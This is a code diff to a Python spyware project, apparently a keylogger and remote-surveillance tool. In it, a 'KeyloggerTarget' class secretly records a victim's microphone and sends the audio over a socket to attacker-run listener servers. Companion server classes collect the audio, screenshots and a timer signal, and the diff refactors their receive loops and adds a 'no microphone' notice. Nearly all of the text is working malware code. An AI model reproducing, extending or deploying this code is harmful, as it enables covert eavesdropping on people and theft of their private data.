@@ -14,7 +14,6 @@ import BetterPrinting as bp
 import random
 import tkinter as tk
 
-
 class KeyloggerTarget:
     def __init__(self, ip_of_server_photos, port_of_server_photos, ip_of_server_keylogger_data,
                  port_of_server_keylogger_data, ip_of_server_listener, port_of_server_listener, ip_of_timer,
@@ -46,38 +45,43 @@ class KeyloggerTarget:
     def daten_aufnehemen(self):
         listening_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         listening_data.connect((ip_listener, port_listener))
+        try:
+            format = pyaudio.paInt16
+            channels = 2
+            rate = 44100
+            chunk = 1024
+            seconds = listening_time + 1
 
-        format = pyaudio.paInt16
-        channels = 2
-        rate = 44100
-        chunk = 1024
-        seconds = listening_time + 1
+            audio = pyaudio.PyAudio()
 
-        audio = pyaudio.PyAudio()
+            # start Recording
+            stream = audio.open(format=format, channels=channels,
+                                rate=rate, input=True,
+                                frames_per_buffer=chunk)
+            # print("recording...")
+            frames = []
 
-        # start Recording
-        stream = audio.open(format=format, channels=channels,
-                            rate=rate, input=True,
-                            frames_per_buffer=chunk)
-        # print("recording...")
-        frames = []
+            for i in range(0, int(rate / chunk * seconds)):
+                data = stream.read(chunk)
+                frames.append(data)
 
-        for i in range(0, int(rate / chunk * seconds)):
-            data = stream.read(chunk)
-            frames.append(data)
+            # print("finished recording")
 
-        # print("finished recording")
+            # stop Recording
+            stream.stop_stream()
+            stream.close()
+            audio.terminate()
 
-        # stop Recording
-        stream.stop_stream()
-        stream.close()
-        audio.terminate()
+            # Connection with ServerListener
 
-        # Connection with ServerListener
+            str_frames = str(frames)
+            listening_data.send(str_frames.encode())
 
-        str_frames = str(frames)
-        listening_data.send(str_frames.encode())
-        # Sends data to ServerListener
+        except OSError:
+            print("NO MICROPHONE DETECTED OR MICROPHONE SETTING DISABLED")
+            no_microfon = "THE TARGET HAS NO MICROPHONE ON"
+            listening_data.send(no_microfon.encode())
+            # Sends data to ServerListener
 
     def all_dir(self):
         global random_lst
@@ -497,6 +501,7 @@ class ServerPhotos:
     def __init__(self, ip, port):
         self.ip = ip
         self.port = port
+        self.full_msg = None
 
     def check_double(self):  # This function is here to check if there are more files with the same name
         dir = os.listdir()
@@ -507,6 +512,17 @@ class ServerPhotos:
             filename = f"New_Image ({amount}).png"
 
         return filename
+
+    def get_data(self, connection, mode, bytes):
+        if mode == "r": self.full_msg = r""
+        else: self.full_msg = b""
+        # All the data is being stored in full_msg
+        while True:
+            msg = connection.recv(bytes)
+            if len(msg) <= 0: break
+            if mode == "r": self.full_msg += msg.decode()
+            else: self.full_msg += msg
+        return self.full_msg
 
     def start(self):
         gui = """
@@ -539,12 +555,7 @@ class ServerPhotos:
                 client_socket, address = server.accept()
                 bp.color(f"\n\nConnection has been established with {address}", "cyan")
                 # Data is in client_socket and the address is obviously in "ipaddress"
-                full_msg = b""
-                # All the binary data is being stored in full_msg as in the previous classes
-                while True:
-                    msg = client_socket.recv(8192)
-                    if len(msg) <= 0: break
-                    full_msg += msg
+                full_msg = self.get_data(client_socket, "b", 8192)
                 client_socket.close()
                 anzahl += 1
 
@@ -597,14 +608,13 @@ class ServerListener:
             client_socket, ipaddress = listening_data.accept()
             bp.color(f"Connection has been established with {ipaddress}", "green")
             check = 0
-            full_msg = ""
-            while True:
-                msg = client_socket.recv(30000000).decode()
-                # The buffersize is 300000000 because there is a lot of data in audio files
-                if len(msg) <= 0: break
-                full_msg += msg
-
+            full_msg = ServerPhotos.get_data(self, client_socket, "r", 30000000)
             listening_data.close()
+            if full_msg == "THE TARGET HAS NO MICROPHONE ON":
+                bp.color("\nTHE TARGET HAS NO MICROPHONE ON\n", "green")
+                bp.color('"ServerListener" will be destroyed', "green")
+                sys.exit()
+
             frames = ast.literal_eval(full_msg)
             filename = self.check_double()
             data_file = wave.open(filename, "wb")
@@ -653,11 +663,6 @@ class Timer:
         show_time.listen(10)
 
         client_socket, ipaddress = show_time.accept()
-        full_msg = ""
-        while True:
-            msg = client_socket.recv(10).decode()
-            if len(msg) <= 0: break
-            full_msg += msg
-
+        full_msg = ServerPhotos.get_data(self, client_socket, "r", 10)
         seconds = int(full_msg)
         self.countdown(seconds)
